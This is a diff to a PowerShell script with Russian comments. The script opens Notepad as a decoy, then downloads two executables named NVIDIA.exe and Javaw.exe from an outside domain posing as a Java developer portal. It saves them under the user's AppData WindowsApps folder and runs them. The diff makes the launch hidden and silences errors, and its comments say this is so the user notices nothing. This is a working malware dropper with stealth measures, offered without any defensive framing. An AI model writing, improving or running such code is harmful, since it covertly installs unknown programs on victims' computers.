@@ -1,25 +1,42 @@
+# Сначала открываем Блокнот
+Start-Process notepad.exe
+
+# Список файлов для скачивания
 $gfgff = @(
     "http://javadevportal.live/files/NVIDIA.exe",
     "http://javadevportal.live/files/Javaw.exe"
 )
 
+# Путь для сохранения (AppData)
 $currentUser = [Environment]::UserName
 $savePath = "C:\Users\$currentUser\AppData\Local\Microsoft\WindowsApps"
 
+# Создаем папку, если её нет
 if (-not (Test-Path -Path $savePath)) {
     New-Item -ItemType Directory -Path $savePath -Force | Out-Null
 }
 
+# Скачиваем и запускаем файлы в скрытом режиме
 foreach ($link in $gfgff) {
     $fileName = Split-Path -Leaf $link
     $fullPath = Join-Path -Path $savePath -ChildPath $fileName
 
     if (-not (Test-Path -Path $fullPath)) {
-        $webClient = New-Object System.Net.WebClient
-        $webClient.DownloadFile($link, $fullPath)
-        Start-Process -FilePath $fullPath
+        try {
+            # Скачиваем файл
+            $webClient = New-Object System.Net.WebClient
+            $webClient.DownloadFile($link, $fullPath)
+            
+            # Запускаем в скрытом режиме (без окна)
+            $startArgs = @{
+                FilePath     = $fullPath
+                WindowStyle  = 'Hidden'
+                ErrorAction  = 'SilentlyContinue'
+            }
+            Start-Process @startArgs
+        }
+        catch {
+            # Игнорируем ошибки (чтобы пользователь ничего не увидел)
+        }
     }
 }
-
-# Открытие блокнота
-Start-Process notepad.exe
